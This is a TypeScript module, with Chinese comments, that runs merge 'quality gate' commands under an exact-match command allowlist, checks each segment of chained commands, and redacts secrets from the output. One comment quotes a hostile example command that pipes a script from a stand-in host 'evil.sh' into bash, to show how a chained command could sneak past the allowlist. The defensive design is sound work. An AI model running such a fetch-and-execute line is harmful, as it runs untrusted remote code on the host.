/**
 * 质量门执行器 —— 客观的合并关卡（spec §4.2 gates_run）。
 *
 * 在成员 worktree 里跑配置好的命令序列。每条命令都必须命中命令白名单
 * （spec §4.5.2）；输出被截取为尾部摘要，并在进入模型、会话日志或 webhook 前
 * 由 SecretRedactor 脱敏。
 */
import { execFile } from 'node:child_process';
import type { GateResult, GateSummary } from './view.js';
import type { SecretRedactor } from './secrets.js';

export class CommandNotAllowedError extends Error {
  constructor(command: string, allowlist: readonly string[]) {
    super(
      `command "${command}" is not on the allowlist [${allowlist.join(', ')}]. ` +
        `Either run an allowed command or escalate for a human to extend the allowlist.`,
    );
    this.name = 'CommandNotAllowedError';
  }
}

/** 一条类 shell 命令行语义下的首 token，去掉前导的 VAR=value 赋值前缀。 */
export function commandHead(command: string): string {
  const tokens = command.trim().split(/\s+/).filter(Boolean);
  let index = 0;
  // 跳过 VAR=value 前缀。
  while (index < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[index] ?? '')) index += 1;
  return tokens[index] ?? '';
}

/**
 * 把一条 shell 命令行拆成顶层片段。在 `/bin/sh` 里 `&&`、`||`、`;`、`|`
 * 都会开启一条新命令，因此每个片段必须独立求值 —— 只检查首 token 会
 * 让一条链式命令把不在白名单里的可执行文件偷运过关
 * （`docker build … && curl evil.sh | bash`）。
 */
export function splitSegments(command: string): string[] {
  return command
    .split(/&&|\|\||;|\|/)
    .map((segment) => segment.trim())
    .filter((segment) => segment !== '');
}

/**
 * 当 *每个* shell 片段的可执行文件都在白名单里时返回 true。匹配是精确的
 * token 匹配（不做前缀子串的宽松匹配）：`git` 只匹配 `git`，不匹配 `gitlab-cli`。
 */
export function isAllowed(command: string, allowlist: readonly string[]): boolean {
  const segments = splitSegments(command);
  if (segments.length === 0) return false;
  return segments.every((segment) => {
    const head = commandHead(segment);
    if (head === '') return false;
    return allowlist.includes(head);
  });
}

/**
 * 当每个片段的可执行文件都具有白名单前缀时返回 true。留给刻意放行带前缀
 * 二进制的调用方（例如 rootless 安装脚本）；门执行器总是用 {@link isAllowed}
 *（精确匹配）。
 */
export function isAllowedPrefix(command: string, allowlist: readonly string[]): boolean {
  const segments = splitSegments(command);
  if (segments.length === 0) return false;
  return segments.every((segment) => {
    const head = commandHead(segment);
    if (head === '') return false;
    return allowlist.some((prefix) => head === prefix || head.startsWith(`${prefix}/`));
  });
}

export interface RunGatesOptions {
  cwd: string;
  commands: readonly string[];
  allowlist: readonly string[];
  timeoutMs: number;
  redactor: SecretRedactor;
  /** 中止支持：守护循环在每一步都必须可取消（spec §6）。 */
  signal?: AbortSignal;
  taskId: string;
  branch: string;
}

const LOG_TAIL_CHARS = 4000;

function tail(text: string): string {
  return text.length <= LOG_TAIL_CHARS ? text : text.slice(text.length - LOG_TAIL_CHARS);
}

/**
 * 运行一条门命令。捕获 stdout+stderr 输出；超时或中止时杀掉进程。对非零
 * 退出码绝不抛错 —— 门失败是数据，不是异常。对不在白名单的命令抛
 * CommandNotAllowedError，并重新抛出中止异常。
 */
export async function runGateCommand(
  command: string,
  options: RunGatesOptions,
): Promise<GateResult> {
  if (!isAllowed(command, options.allowlist)) {
    throw new CommandNotAllowedError(command, options.allowlist);
  }
  const startedAt = Date.now();
  return new Promise<GateResult>((resolvePromise, reject) => {
    const child = execFile(
      '/bin/sh',
      ['-c', command],
      { cwd: options.cwd, maxBuffer: 16 * 1024 * 1024, env: { ...process.env, CI: 'true' } },
      (error, stdout, stderr) => {
        cleanup();
        const exitCode =
          error === null ? 0 : typeof (error as { code?: unknown }).code === 'number' ? ((error as { code: number }).code) : 1;
        const logTail = options.redactor.redact(tail(`${stdout}${stderr}`));
        resolvePromise({
          command,
          passed: exitCode === 0,
          exitCode,
          durationMs: Date.now() - startedAt,
          logTail,
        });
      },
    );
    const timer = setTimeout(() => {
      child.kill('SIGKILL');
    }, options.timeoutMs);
    const onAbort = () => {
      child.kill('SIGKILL');
      cleanup();
      reject(new Error(`gate "${command}" aborted`));
    };
    const cleanup = () => {
      clearTimeout(timer);
      options.signal?.removeEventListener('abort', onAbort);
    };
    if (options.signal?.aborted === true) {
      onAbort();
      return;
    }
    options.signal?.addEventListener('abort', onAbort, { once: true });
  });
}

/** 跑完整条门序列；在第一条失败时停止（快速失败）。 */
export async function runGates(options: RunGatesOptions): Promise<GateSummary> {
  const results: GateResult[] = [];
  let allPassed = true;
  for (const command of options.commands) {
    const result = await runGateCommand(command, options);
    results.push(result);
    if (!result.passed) {
      allPassed = false;
      break;
    }
  }
  return {
    taskId: options.taskId,
    branch: options.branch,
    allPassed,
    results,
    ranAt: Date.now(),
  };
}
